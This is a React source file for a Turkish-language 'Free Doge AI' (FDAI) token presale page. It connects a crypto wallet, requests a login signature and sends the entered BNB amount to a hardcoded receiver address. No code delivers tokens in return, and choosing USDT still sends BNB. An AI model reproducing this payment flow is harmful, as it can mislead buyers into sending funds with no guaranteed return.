const { useState, useEffect } = React;

function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [account, setAccount] = useState('');
  const [buyAmount, setBuyAmount] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('bnb');
  const [isMobile, setIsMobile] = useState(false);
  const [showWalletSelector, setShowWalletSelector] = useState(false);
  const [walletType, setWalletType] = useState('');

  // Mobil kontrolü
  useEffect(() => {
    const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    setIsMobile(mobile);
    
    // Eğer MetaMask/Trust Wallet tarayıcısından geliyorsa
    if (mobile && window.ethereum) {
      checkConnection();
    }
  }, []);

  // Bağlantı kontrolü
  const checkConnection = async () => {
    if (window.ethereum && window.ethereum.selectedAddress) {
      setAccount(window.ethereum.selectedAddress);
      setIsConnected(true);
    }
  };

  // Cüzdan seçiciyi aç
  const openWalletSelector = () => {
    setShowWalletSelector(true);
  };

  // Cüzdan bağlama
  const connectWallet = async (wallet) => {
    try {
      setWalletType(wallet);
      
      if (wallet === 'metamask') {
        // MetaMask bağlantısı
        if (window.ethereum) {
          const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
          });
          handleConnectionSuccess(accounts[0]);
        } else if (isMobile) {
          // Mobilde MetaMask linki
          window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}`;
        } else {
          alert('Lütfen MetaMask eklentisini yükleyin!');
        }
      } 
      else if (wallet === 'trustwallet') {
        // Trust Wallet bağlantısı
        if (window.ethereum && window.ethereum.isTrust) {
          const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
          });
          handleConnectionSuccess(accounts[0]);
        } else if (isMobile) {
          // Mobilde Trust Wallet linki
          window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
        } else {
          alert('Lütfen Trust Wallet eklentisini yükleyin!');
        }
      }
    } catch (error) {
      console.error('Bağlantı hatası:', error);
      alert(`Bağlantı hatası: ${error.message}`);
    }
  };

  const handleConnectionSuccess = (account) => {
    setAccount(account);
    setIsConnected(true);
    setShowWalletSelector(false);
    
    // Mobil imza isteği
    if (isMobile) {
      signMessage(account);
    }
  };

  // Mobil imza işlemi
  const signMessage = async (account) => {
    try {
      const message = "FDAI Presale giriş onayı";
      const signature = await window.ethereum.request({
        method: 'personal_sign',
        params: [message, account],
      });
      console.log('İmza başarılı:', signature);
    } catch (error) {
      console.error('İmza hatası:', error);
    }
  };

  // Token satın alma
  const buyTokens = async () => {
    if (!buyAmount || isNaN(buyAmount)) {
      alert('Lütfen geçerli bir miktar girin!');
      return;
    }
    
    try {
      const amountWei = web3.utils.toWei(buyAmount, 'ether');
      const tx = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: account,
          to: '0xd924e01c7d319c5b23708cd622bd1143cd4fb360',
          value: amountWei,
          gas: '50000',
        }],
      });
      
      alert(`İşlem başarılı! TX Hash: ${tx}`);
    } catch (error) {
      console.error('Satın alma hatası:', error);
      alert(`Satın alma hatası: ${error.message}`);
    }
  };

  return (
    <div className="container py-4">
      <header className="text-center mb-5">
        <h1 className="display-4">Ücretsiz Doge AI Ön Satışı</h1>
        <p className="lead">FDAI token ön satışına hemen katılın!</p>
      </header>

      <div className="card shadow-lg mb-4">
        <div className="card-body p-4">
          <h2 className="text-center mb-4">FDAI Tokenleri Satın Alın</h2>
          
          {!isConnected ? (
            <div className="text-center">
              <h4>Cüzdanı Bağla</h4>
              
              {showWalletSelector ? (
                <div className="wallet-selector mt-3">
                  <button 
                    className="btn btn-outline-primary w-100 mb-2"
                    onClick={() => connectWallet('metamask')}
                  >
                    <img src="https://metamask.io/images/favicon-128.png" width="24" className="me-2" />
                    MetaMask ile Bağlan
                  </button>
                  
                  <button 
                    className="btn btn-outline-dark w-100"
                    onClick={() => connectWallet('trustwallet')}
                  >
                    <img src="https://trustwallet.com/assets/images/favicon.png" width="24" className="me-2" />
                    Trust Wallet ile Bağlan
                  </button>
                  
                  <button 
                    className="btn btn-link mt-3"
                    onClick={() => setShowWalletSelector(false)}
                  >
                    Geri Dön
                  </button>
                </div>
              ) : (
                <>
                  <p className="text-muted mb-3">
                    {isMobile 
                      ? "Lütfen cüzdan tarayıcınızı kullanın" 
                      : "Lütfen bir cüzdan seçin"}
                  </p>
                  <button 
                    className="btn btn-primary btn-lg"
                    onClick={openWalletSelector}
                  >
                    Cüzdan Seç
                  </button>
                </>
              )}
            </div>
          ) : (
            <div className="connected-wallet">
              <div className="alert alert-success">
                <strong>Bağlı Cüzdan:</strong> 
                <div className="wallet-address">
                  {`${account.substring(0, 6)}...${account.substring(account.length - 4)}`}
                </div>
                <div className="wallet-type mt-1">
                  {walletType === 'metamask' ? 'MetaMask' : 'Trust Wallet'}
                </div>
              </div>
              
              <div className="buy-section mt-4">
                <div className="mb-3">
                  <label className="form-label">Ödeme Yöntemi</label>
                  <select 
                    className="form-select"
                    value={paymentMethod}
                    onChange={(e) => setPaymentMethod(e.target.value)}
                  >
                    <option value="bnb">BNB</option>
                    <option value="usdt">USDT</option>
                  </select>
                </div>
                
                <div className="mb-3">
                  <label className="form-label">Miktar ({paymentMethod.toUpperCase()})</label>
                  <input
                    type="number"
                    className="form-control"
                    value={buyAmount}
                    onChange={(e) => setBuyAmount(e.target.value)}
                    placeholder={`${paymentMethod.toUpperCase()} miktarı girin`}
                  />
                </div>
                
                <div className="token-calculation mb-3 p-3 bg-light rounded">
                  <h5>Alacağınız FDAI Miktarı</h5>
                  <h3 className="text-success">
                    {buyAmount && !isNaN(buyAmount) 
                      ? paymentMethod === 'bnb' 
                        ? (buyAmount * 120000000000).toLocaleString() 
                        : (buyAmount * 200000000).toLocaleString()
                      : '0'} FDAI
                  </h3>
                </div>
                
                <button 
                  className="btn btn-success w-100 py-3"
                  onClick={buyTokens}
                >
                  Şimdi Satın Al
                </button>
              </div>
              
              <button 
                className="btn btn-outline-danger w-100 mt-3"
                onClick={() => setIsConnected(false)}
              >
                Bağlantıyı Kes
              </button>
            </div>
          )}
        </div>
      </div>

      <div className="card shadow-lg">
        <div className="card-body p-4">
          <h3 className="text-center mb-3">Jeton Bilgileri</h3>
          <div className="token-info">
            <h4>Jeton Fiyatı</h4>
            <ul className="list-group list-group-flush mb-3">
              <li className="list-group-item">1 BNB = 120.000.000.000 FDAI</li>
              <li className="list-group-item">1 USDT = 200.000.000 FDAI</li>
            </ul>
            
            <h4>Kontrat Adresi</h4>
            <div className="p-2 bg-light rounded mb-3">
              <code>0x8161698A74F2ea0035B9912ED60140893Ac0f39C</code>
            </div>
            
            <h4>Alıcı Adresi</h4>
            <div className="p-2 bg-light rounded">
              <code>0xd924e01c7d319c5b23708cd622bd1143cd4fb360</code>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

ReactDOM.render(<App />, document.getElementById('root'));
